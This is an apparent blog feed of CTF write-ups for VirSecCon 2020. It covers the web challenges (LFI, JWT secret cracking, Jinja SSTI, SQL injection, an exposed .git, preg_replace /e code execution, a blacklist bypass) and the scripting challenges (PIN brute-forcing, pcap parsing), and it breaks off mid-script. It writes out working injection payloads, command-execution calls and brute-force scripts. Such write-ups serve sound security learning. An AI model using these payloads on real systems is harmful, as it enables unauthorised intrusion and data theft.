root@gr4n173:~# echo &quot;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== &quot; | base64 -d  
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*
    // _______________________________________________________________

                        LLS{lmfao_php_filters_ftw}

    // _______________________________________________________________
    */&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;6-jawt&quot;&gt;6. JaWT&lt;/h3&gt;
&lt;h4 id=&quot;description-90-1&quot;&gt;Description [90]&lt;/h4&gt;
&lt;p&gt;Check the admin’s scratchpad!&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50019/&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:-On visiting the site I was able to login in as any user except &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; so I fired my burp-suite and while intercepting with burp-suite I got the cookie parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;jwt&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.5nMC3j7S-1AH_LuDtr4LQwfnnN_3MiX--d1B07Kt07A&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Header:-&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;{
  “alg”: “HS256”,
  “typ”: “JWT”
}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Payload:-&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;{
  “user”: “user”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I found a superb website to edit jwt &lt;a href=&quot;https://jwt.io/&quot;&gt;jwt.io&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;and now requied a secret key for that I used john to crack the jwt&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~#echo &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.DjF2o4bohTFKW9dyR6QfpU397jLnmvITGK8KgCYmXhQ&quot; &amp;gt; jwt
root@gr4n173:~# john jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
fuckit           (?)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I used that secret key and edited user &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/jwt_token_virseccon.png&quot; alt=&quot;jwt_token&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and submited in burp-suite and finally got the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/jwt_flag_virseccon.png&quot; alt=&quot;jwt_flag&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{jawt_was_just_what_you_thought}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;7-mask&quot;&gt;7. Mask&lt;/h3&gt;
&lt;h4 id=&quot;description-90-2&quot;&gt;Description [90]&lt;/h4&gt;
&lt;p&gt;Take off your mask.&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50023.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:-After visiting challenge website I got the Jinja =&amp;gt; Python template so first thing I thought was only Server-Side Template Injection(SSTI). so I tried&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/payload_virseccon.jpg&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;4&lt;/code&gt; as output so then checked for &lt;code class=&quot;highlighter-rouge&quot;&gt;config&lt;/code&gt; files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/config_virseccon.jpg&quot; alt=&quot;config&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And got the many configuration keys along with &lt;code class=&quot;highlighter-rouge&quot;&gt;secret key&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;``‘SECRET_KEY’: ‘LLS{server_side_template_injection_unmasked}`&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This way I got the flag. If you like to read more about SSTI then you can visit &lt;a href=&quot;https://owasp-skf.gitbook.io/asvs-write-ups/kbid-267-server-side-template-injection&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;8-10-character-web-shell&quot;&gt;8. 10 Character Web Shell&lt;/h3&gt;
&lt;h4 id=&quot;description-100&quot;&gt;Description [100]&lt;/h4&gt;
&lt;p&gt;Only 10 char–&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50001.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the challenge I got a simple php backend code.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;too long!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and used paramter as &lt;code class=&quot;highlighter-rouge&quot;&gt;http://jh2i.com:50001/?c=cat flag*&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{you_really_can_see_in_the_dark} &lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This way I got the flag .&lt;/p&gt;

&lt;h3 id=&quot;9-sequelitis&quot;&gt;9. Sequelitis&lt;/h3&gt;
&lt;h4 id=&quot;description-100-1&quot;&gt;Description [100]&lt;/h4&gt;
&lt;p&gt;Sequelitis has moved to a new database for keeping track of their customers. Break in.&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50034.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As the challenge name &lt;code class=&quot;highlighter-rouge&quot;&gt;Sequelitis&lt;/code&gt; which indicate there was sqli. So at first I tried a simple payload &lt;code class=&quot;highlighter-rouge&quot;&gt;' or 1==1 --&lt;/code&gt; didn’t work and slightly changed to &lt;code class=&quot;highlighter-rouge&quot;&gt;'or 1==1 -- -&lt;/code&gt; I got the output&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trey Maxam: 1010
Joe Benin: 2001
Grant Wyman: 1337
John Hammond: 1785
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So after alot of checking the table and columns my final payload to get flag was &lt;code class=&quot;highlighter-rouge&quot;&gt;' union select value,2,3  from flag -- -&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{explicit_sqli_is_how_sql_will_die} 2: 3&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;10-dairy-products&quot;&gt;10. Dairy Products&lt;/h3&gt;
&lt;h4 id=&quot;description-100-2&quot;&gt;Description [100]&lt;/h4&gt;
&lt;p&gt;There is a new advertising campaign on the classic dairy company’s website. You need to steal their latest product.&lt;/p&gt;

&lt;p&gt;Connect here: http://142.93.3.19:50008&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As soon as I visited the challenge got the hint as &lt;code class=&quot;highlighter-rouge&quot;&gt;git milk&lt;/code&gt; and checked &lt;code class=&quot;highlighter-rouge&quot;&gt;.git&lt;/code&gt; dir which gave me a git repo. Then I download to my localmachine .&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;root@gr4n173:~# wget -r –no-parent http://142.93.3.19:50008/.git/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;after that downloaded I used the command as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# git log | grep commit | awk '{print $2}' | while read line;do git show $line;done | grep -i &quot;{.*}&quot;
+LLS{you_gitm_gotm_good_partner}
+for i in {1..10}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;git log =&amp;gt;  It gives the commit history.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;grep commit =&amp;gt; It grep the commit only .&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;awk ‘{print $2}’ =&amp;gt; It just takes the commitsha.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;while read line;do git show $line; =&amp;gt; it makes a loop for every shacommit and show all the commit .&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;grep -i “{.*}” =&amp;gt; It grep the flag.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This way I solved the challenge and got 100 points.&lt;/p&gt;

&lt;h3 id=&quot;11-irregular-expressions&quot;&gt;11. Irregular Expressions&lt;/h3&gt;
&lt;h4 id=&quot;description-100-3&quot;&gt;Description [100]&lt;/h4&gt;
&lt;p&gt;Check out our new regular expressions testbed! Now you can test your regex online at!&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50018/&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the website and viewing the source code I got this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;b&amp;gt;Warning&amp;lt;/b&amp;gt;:  preg_replace(): Unknown modifier '\' in &amp;lt;b&amp;gt;/var/www/html/index.php&amp;lt;/b&amp;gt; on line &amp;lt;b&amp;gt;39&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;as &lt;a href=&quot;https://www.php.net/manual/en/function.preg-replace.php&quot;&gt;pre_replace()&lt;/a&gt; there you can find &lt;code class=&quot;highlighter-rouge&quot;&gt;/e&lt;/code&gt;modifier to run the eval() command so I used it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/irregular_virseccon.png&quot; alt=&quot;irregular_express&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this way I can run the RCE so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;system('ls -al');&lt;/code&gt; to get the files.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;total 16 dr-xr-xr-x 1 www-data www-data 4096 Apr 2 14:33 . drwxr-xr-x 1 root root 4096 Sep 4 2016 .. -r--r--r-- 1 root root 39 Apr 2 14:32 flag_name_dont_guess_plz -rwxr-xr-x 1 root root 2538 Mar 22 00:49 index.php 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So got the final flag using &lt;code class=&quot;highlighter-rouge&quot;&gt;system('cat flag_name_dont_guess_plz');&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{php_preg_replace_may_be_dangerous} &lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;12-get-encoded&quot;&gt;12. GET Encoded&lt;/h3&gt;
&lt;h4 id=&quot;description-125&quot;&gt;Description [125]&lt;/h4&gt;
&lt;p&gt;I don’t GET this%21 Do you%3F&lt;/p&gt;

&lt;p&gt;Connect here: http://jh2i.com:50013&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the challenge,viewing the source code and robots.txt. I got the dir at robots.txt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/robots_virseccon.jpg&quot; alt=&quot;robots.txt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;then I visited that dir &lt;code class=&quot;highlighter-rouge&quot;&gt;http://jh2i.com:50013/?debug&lt;/code&gt; and got the code below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?php

    function debug(){
        highlight_file(__FILE__);

    }
    

    // I hate these functions, they are so insecure!
    $blacklist = &quot;assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob&quot;;


    // If you supply GET arguments, process them...
    // Documentation here: http://php.net/manual/en/reserved.variables.get.php
    if ( count( $_GET ) &amp;gt; 0 ){

        // Check if there are any bad functions in the URL supplied
        if ( preg_match( &quot;/$blacklist/i&quot;, $_SERVER['REQUEST_URI'] ) ) {

            // If there are all, kindly tell them off. ;)
            // Documentation here: http://php.net/manual/en/reserved.variables.server.php
            die( &quot;Go away, hacker! No unsafe functions in \$_SERVER['REQUEST_URI']!!&quot; );
        
        }else{

            // Otherwise, execute code as a usual debugging interface.
            // Pull them out of the GET array as `variable=value` format...
            list( $function, $argument ) = each($_GET);

            // and call what they supply...
            // THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN'T INCLUDE `/?debug`
            echo(&quot;&amp;lt;pre&amp;gt;&quot;);
            $function($argument);
            echo(&quot;&amp;lt;/pre&amp;gt;&quot;);
        }

    }
    
    echo(&quot;&amp;lt;p&amp;gt;Machines hunt for more than humans do.&amp;lt;/p&amp;gt;&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So I sent a request with url encoding technique you see &lt;a href=&quot;https://www.eso.org/~ndelmott/url_encode.html&quot;&gt;here&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;?passthru=cat flag_that_you_could_never_guess.php&lt;/code&gt;  but not decoded the &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/ctf/getencodedflag_virseccon.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This way I solved the challenge.&lt;/p&gt;

&lt;p&gt;This way I was able to solve all challenges from web category except the last one.&lt;/p&gt;

&lt;p&gt;I would like to thank all my reader for being with me. Stay upto date to my blog to see more writeups&lt;/p&gt;

&lt;p&gt;#Stay_Safe&lt;/p&gt;

&lt;p&gt;#COVID-19&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="virseccon" /><category term="ctf" /><category term="webchallenge" /><category term="SSTI" /><category term="PhpJuggler" /><summary type="html">Web Challenges</summary></entry><entry><title type="html">VirSecCon CTF: Scripting Challenges</title><link href="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Scripting Challenges" /><published>2020-04-13T00:00:00+05:45</published><updated>2020-04-13T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/13/virseccon-ctf-scripting</id><content type="html" xml:base="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Scripting is a programming language for a special run-time that automates the execution of tasks; tasks could alternatively be executed one-by-one by a human operator. We people think there is no any difference in between coding and scripting but there is a saying :-&lt;/p&gt;

&lt;p&gt;” All scripting is coding, but not all coding is scripting. “&lt;/p&gt;

&lt;p&gt;During VirSecCon CTF there was also Scripting Category which helped me to make my scripting to get the flag. Here I used python scripting and solved the challenges.&lt;/p&gt;

&lt;h3 id=&quot;1-2048&quot;&gt;1. 2048&lt;/h3&gt;

&lt;h4 id=&quot;description-75&quot;&gt;Description [75]&lt;/h4&gt;
&lt;p&gt;cGx6aGVscG1l=&amp;gt; plzhelpme (base64 decode)&lt;/p&gt;

&lt;p&gt;File: &lt;a href=&quot;/public/files/ctf/2048.zip&quot;&gt;2048.zip&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution: As challenge is zipped, I unzipped that file and got the 2048 file .&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:# cat 2048
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVU
bGhoTVVwVVZtcEJlRll5U2tWVQpiR2hvVFZWd1ZWWnRjRUpsUmxsNVUydFdWUXBpUjJodlZGWldk
MVpXV25SalJVcHNVbXhzTlZVeWRGZFdVWEJwVWpKb2RsWkdXbGRrCk1WcFhWMjVTYWxKVmNITlZi
WGh6VGxaVmVXUkdaRmRWV0VKd1ZXcEtiMlJzV2tkWGJHUnJDazFXY0ZoV01qVlRZV3hLVm1OSVRs
WmkKV0doNlZHeGFWbVZYVWtkYVJtUldWMFZLZDFaWGNFdGlNbEp6VjJ0a1dHSkhVbkpEYXpGWFkw
Wm9WMDFxVmxSWlYzaExWbTFPU1ZScwpXbWtLVjBkb05sWkhlR0ZXYlZaWVZXdGtZVkp0VWxkV01G
WkxaREZhV0dORmRHbE5iRXA2VmpKMGExZEhTa2hWYmtwRVlYcEdXRmt3CldtOVdNREZ4Vm14U1ds
WXphRXhXYlRGUFUxWlNjd3BYYld0TFZqQmtiMDVzV2tobFIwWlhZbFphV1ZaWGRHdFpWa3AwVld4
a1YwMUcKV2t4YVJFWmhWMGRPUm1SSGJFNWlSWEEyVm1wS01HRXhaRWhUYTJoV1ltdHdSVmxZY0Vk
WFJtdDNDbGR0T1ZkTlJFWjRWbTE0VTFkcwpXWHBoUlhoWFlsUkdVRlV4V2xOamQzQllZbGQwVEZa
cVFtdGlNRFZ6VjJ0b2JGSXdXbGhaYkZwaFYxWmFXR1JIZEZwV2EzQXdWbGQ0CmExWXdNVWNLVjJ0
NFlWSkZXbWhXTUdSUFVtMVNTR0pGTldsU1dFRXlWbTF3UzAxSFJYaGFSV2hVWVRKb1YxbHRkSGRT
Vm14WlkwVmsKV0ZKdGRETkRiR1IwVDFaa1RsSkZXalJXYlRFMFZURmtjd3BYV0hCb1VsaG9XRmxz
VWtkVlJsVjRWMnhPYW1RelFsbFpiR1F3VkVaYQpjVkZ0ZEdsTlJGWjZWakowYjJKR1NY........==
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;this indicate the file ASCII text and I tried encoding all many times and I got the flag after 32 decoding. This way I got the 75 points.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# cat 2048(32)
LCSC{i_hope_you_didnt_use_asciitohex.com}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-quick-run&quot;&gt;2. Quick Run&lt;/h3&gt;

&lt;h4 id=&quot;description-75-1&quot;&gt;Description [75]&lt;/h4&gt;
&lt;p&gt;You gotta go fast!&lt;/p&gt;

&lt;p&gt;Download the file below.&lt;/p&gt;

&lt;p&gt;File: &lt;a href=&quot;/public/files/ctf/quick_run.zip&quot;&gt;quick_run.zip&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution: As I unzipped that file I got 31 QR-code images so I wrote a simple script in python to decode this image for that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;pyzbar&lt;/code&gt; module &lt;code class=&quot;highlighter-rouge&quot;&gt;Python Imaging Library(PIL)&lt;/code&gt; .&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~#cat bardecode.py
from PIL import Image
from pyzbar.pyzbar import decode
#!/bin/python3
res = []
for i in range(0,34):
        img = Image.open(&quot;quick_run/&quot;+str(i)+&quot;.png&quot;)
        data = decode(img)
        res.append(data[0].data)
        img.close()
        print(chr(int(data[0].data)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Then I run the script and got the flag with 75 points added.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~# python3 bardecode.py
L                                                                                                                                                     
L                                                                                                                                                     
S                                                                                                                                                     
{                                                                                                                                                     
z
b
a
r
i
m
g
_
m
a
k
e
s
_
q
r
c
o
d
e
s
_
e
a
s
y
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;3-pincode&quot;&gt;3. Pincode&lt;/h3&gt;

&lt;h4 id=&quot;description-75-2&quot;&gt;Description [75]&lt;/h4&gt;
&lt;p&gt;This service needs a 4 digit pincode to authenticate… can you help me figure it out!??&lt;/p&gt;

&lt;p&gt;Connect with:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc jh2i.com 50031&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Solution: As the server require 4 digit pincode so only way to enter the digit is from 0000 to 9999 so I wrote a simple script in python.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roo@gr4n173:~# cat pincode.py
from __future__ import print_function
from pwn import *

pin = 0
while pin &amp;lt; 9999:
    print(pin,end=&quot;&quot;)
    r = remote('jh2i.com', 50031)
    r.recvuntil(&quot;:&quot;)
    r.send(str(&quot;%04d&quot; % (pin)))
    hashi = r.recvline()
    print(hashi)
    
    r.close()
    if(&quot;INCORRECT!&quot; not in hashi):
        break
    pin+=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After 37 step I got the flag and 75 points was added.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;......                                                                                             
[*] Closed connection to jh2i.com port 50031

37[+] Opening connection to jh2i.com on port 50031: Done  
CORRECT! Here is your flag: LLS{for_i_in_0000_to_9999}                                                                                                
                                                                                                                                                      
[*] Closed connection to jh2i.com port 50031 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;4-loopback&quot;&gt;4. Loopback&lt;/h3&gt;
&lt;h4 id=&quot;description-100&quot;&gt;Description [100]&lt;/h4&gt;
&lt;p&gt;Hello? Hello? Oh hello! Oh hello!&lt;/p&gt;

&lt;p&gt;Download the file below.&lt;/p&gt;

&lt;p&gt;File: &lt;a href=&quot;/public/files/ctf/loopback.zip&quot;&gt;lookback.zip&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution: As I unzipped that file I got the loopback.pcap file so I used the tshark tool to analyze the &lt;code class=&quot;highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; file and wrote a simple python script to analyze the raw file and finally I got the flag.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~#tshark -r loopback.pcap -T fields -e data &amp;gt; raw.txt

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n17:~#cat loopback.py
#!/bin/python3
#python loopback.py &amp;gt; result.txt
from __future__ import print_function
import binascii
import sys
import string
data = open(&quot;raw.txt&quot;,'r').read().splitlines()

chars = string.ascii_letters + string.digits + string.punctuation

res = ''
i=0
for a in data:
    decoded = a.decode(&quot;hex&quot;)[8:].strip()
    try:
        if(decoded[0] in chars):
            res+=decoded[0]
        i+=1
    except IndexError as identifier:
        pass

print(res)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Flag
	 LLSS{icmp_is_the_protocol_for_me}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;5-grammer&quot;&gt;5. Grammer&lt;/h3&gt;

&lt;h4 id=&quot;description-125&quot;&gt;Description [125]&lt;/h4&gt;
&lt;p&gt;It’s only one letter away!&lt;/p&gt;

&lt;p&gt;Connect with:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc jh2i.com 50012&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Solution: As the	server ask for flag I made a simple python script to brute-force the correct flag containing alphabet and symbols.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~#cat grammer.py
from __future__ import print_function
from pwn import *
import string
flag = &quot;LLS{&quot;
r = remote('jh2i.com', 50012)

chars = string.ascii_letters + string.digits + string.punctuation
